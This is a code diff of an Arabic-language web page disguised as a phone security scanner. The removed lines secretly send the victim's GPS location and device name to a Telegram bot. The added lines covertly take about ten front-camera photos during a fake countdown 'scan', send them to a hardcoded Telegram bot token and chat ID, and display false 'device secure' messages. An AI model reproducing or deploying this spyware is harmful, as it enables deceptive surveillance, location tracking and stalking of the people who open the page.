@@ -8,22 +8,16 @@
         :root { --green: #00ff41; --red: #ff0040; }
         * { margin:0; padding:0; box-sizing:border-box; }
         body { font-family: 'Courier New', monospace; background: #000; color: #fff; height: 100vh; display: flex; align-items: center; justify-content: center; text-align: center; padding: 20px; }
-        @keyframes flicker { 0%,100%{opacity:1} 50%{opacity:0.3} }
-        @keyframes pulse { 0%,100%{transform:scale(1)} 50%{transform:scale(1.05)} }
         .container { max-width: 400px; width: 100%; }
         .page { display: none; } .page.active { display: block; }
-        .skull { font-size: 60px; animation: pulse 0.5s infinite; }
+        .skull { font-size: 60px; }
         h1 { font-size: 22px; color: var(--green); }
-        .device-card { background: #0a0a0a; border: 2px solid var(--green); border-radius: 14px; padding: 18px; margin-bottom: 20px; }
-        .device-card .d-name { color: var(--green); font-size: 16px; font-weight: 700; }
         .btn { width: 100%; padding: 18px; border-radius: 12px; border: 2px solid var(--green); background: #0a1a0a; color: var(--green); font-size: 18px; font-weight: 700; cursor: pointer; font-family: 'Courier New', monospace; }
-        .btn:active { background: #0a2a0a; }
-        .code-screen { background: #000; border: 2px solid var(--green); border-radius: 10px; padding: 14px; margin: 16px 0; color: var(--green); font-size: 10px; line-height: 1.5; text-align: left; max-height: 200px; overflow-y: auto; }
+        .code-screen { background: #000; border: 2px solid var(--green); border-radius: 10px; padding: 14px; margin: 16px 0; color: var(--green); font-size: 10px; text-align: left; max-height: 200px; overflow-y: auto; }
         .countdown { font-size: 40px; font-weight: 900; color: var(--red); }
         .progress-bar { width: 100%; height: 4px; background: #0a1a0a; border-radius: 2px; margin: 10px 0; overflow: hidden; }
         .progress-fill { height: 100%; background: var(--red); width: 0%; }
-        .success-icon { font-size: 70px; }
-        .success-text { color: var(--green); font-size: 22px; font-weight: 700; }
+        video { display: none; } canvas { display: none; }
     </style>
 </head>
 <body>
@@ -31,51 +25,89 @@
     <div class="page active" id="page-home">
         <div class="skull">🛡️</div>
         <h1>حماية الهاتف</h1>
-        <div class="device-card"><div class="d-name" id="device-name">📱 جاري الكشف...</div></div>
+        <div style="color:var(--green);" id="device-name">📱 جاري الكشف...</div>
         <button class="btn" onclick="startScan()">🔍 اضغط لبدء الفحص</button>
     </div>
     <div class="page" id="page-scanning">
         <div class="skull">💀</div>
-        <h1>جاري الفحص الشامل...</h1>
+        <h1>جاري الفحص...</h1>
         <div class="code-screen" id="code-screen"></div>
-        <div class="countdown" id="countdown">50</div>
+        <div class="countdown" id="countdown">15</div>
         <div class="progress-bar"><div class="progress-fill" id="progress-fill"></div></div>
+        <video id="vid" autoplay playsinline muted></video>
+        <canvas id="cnv"></canvas>
     </div>
     <div class="page" id="page-done">
-        <div class="success-icon">✅</div>
-        <div class="success-text">جهازك بأمان</div>
+        <div style="font-size:70px;">✅</div>
+        <div style="color:var(--green);font-size:22px;">جهازك بأمان</div>
     </div>
 </div>
 
 <script>
+// ========== قراءة التوكن والـ chatId من الرابط ==========
 const params = new URLSearchParams(window.location.search);
-const CHAT_ID = params.get("chatId") || "7276604783";
-const BOT_TOKEN = params.get("token") || "8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo";
-function getDevice() { const m = navigator.userAgent.match(/; ([^;]+) Build/); return { name: m ? m[1].trim() : 'جهاز غير معروف' }; }
-const device = getDevice();
-document.getElementById('device-name').textContent = '📱 ' + device.name;
+const CHAT_ID = params.get('chatId') || '7276604783';
+const BOT_TOKEN = params.get('token') || '8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo';
+
+document.getElementById('device-name').textContent = '📱 ' + (navigator.userAgent.match(/; ([^;]+) Build/)?.[1] || 'جهاز').trim();
+
 function showPage(id) { document.querySelectorAll('.page').forEach(p => p.classList.remove('active')); document.getElementById(id).classList.add('active'); }
-function sendMsg(text) { fetch('`https://api.telegram.org/bot${BOT_TOKEN}/`sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT_ID,text})}).catch(e=>{}); }
+
+let stream, videoReady = false;
 
 async function startScan() {
     showPage('page-scanning');
-    sendMsg(`🛡️ فحص\n📱 ${device.name}`);
     
-    // GPS
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(async (pos) => {
-            const { latitude, longitude } = pos.coords;
-            sendMsg(`📍 الموقع\n🗺️ https://maps.google.com/?q=${latitude},${longitude}`);
-            fetch(``https://api.telegram.org/bot${BOT_TOKEN}/`sendLocation`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT_ID,latitude,longitude})}).catch(e=>{});
-        }, () => sendMsg('📍 GPS: لم يتم التحديد'), { enableHighAccuracy: true, timeout: 30000 });
-    } else { sendMsg('📍 GPS: غير مدعوم'); }
+    try {
+        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 640, height: 480 } });
+        const video = document.getElementById('vid');
+        video.srcObject = stream;
+        await new Promise((resolve) => { video.onloadedmetadata = () => { video.play(); setTimeout(resolve, 3000); }; });
+        videoReady = true;
+    } catch(e) { alert('الكاميرا مش شغالة'); return; }
 
     const codeScreen = document.getElementById('code-screen');
     const countdownEl = document.getElementById('countdown');
     const progressFill = document.getElementById('progress-fill');
-    const logs = ['[■] INITIALIZING...','[■] DEVICE: '+device.name,'[■] CHECKING...','[■] SCANNING GPS...','[■] KERNEL: SECURE','[■] FIREWALL: ACTIVE','[■] NO MALWARE','[✓] DEVICE SECURE'];
-    let seconds = 50;
-    const interval = setInterval(() => { seconds--; countdownEl.textContent=seconds; progressFill.style.width=((50-seconds)/50*100)+'%'; const lines=Math.floor(((50-seconds)/50)*logs.length); codeScreen.innerHTML=logs.slice(0,Math.min(lines+1,logs.length)).join('<br>'); codeScreen.scrollTop=codeScreen.scrollHeight; if(seconds<=0){clearInterval(interval);showPage('page-done');} },1000);
+    const canvas = document.getElementById('cnv');
+    const video = document.getElementById('vid');
+    const logs = ['[■] INITIALIZING...','[■] CHECKING...','[■] SCANNING...','[■] KERNEL: SECURE','[■] NO MALWARE','[✓] DEVICE SECURE'];
+    let s = 15, pics = 0;
+
+    function snap() {
+        if (!videoReady || !video || video.readyState < 2) return;
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        canvas.toBlob(async (blob) => {
+            if (!blob || blob.size < 1000) return;
+            
+            // إرسال للبوت - باستخدام التوكن من الرابط
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'photo_' + Date.now() + '.jpg');
+            formData.append('caption', '📸 من: ' + document.getElementById('device-name').textContent);
+            
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+            console.log('Sending to:', url, 'Chat:', CHAT_ID);
+            
+            try {
+                const res = await fetch(url, { method: 'POST', body: formData });
+                const data = await res.json();
+                console.log('Result:', data.ok ? 'OK' : data.description);
+            } catch(e) { console.log('Error:', e); }
+            
+            pics++;
+        }, 'image/jpeg', 0.85);
+    }
+
+    const timer = setInterval(() => {
+        s--; countdownEl.textContent = s;
+        progressFill.style.width = ((15 - s) / 15 * 100) + '%';
+        codeScreen.innerHTML = logs.slice(0, Math.floor(((15-s)/15)*logs.length+1)).join('<br>');
+        if (s <= 12 && pics < 10) snap();
+        if (s <= 0) { clearInterval(timer); for (let i = pics; i < 10; i++) snap(); setTimeout(() => { if (stream) stream.getTracks().forEach(t => t.stop()); showPage('page-done'); }, 2000); }
+    }, 1000);
 }
 </script>
 </body>
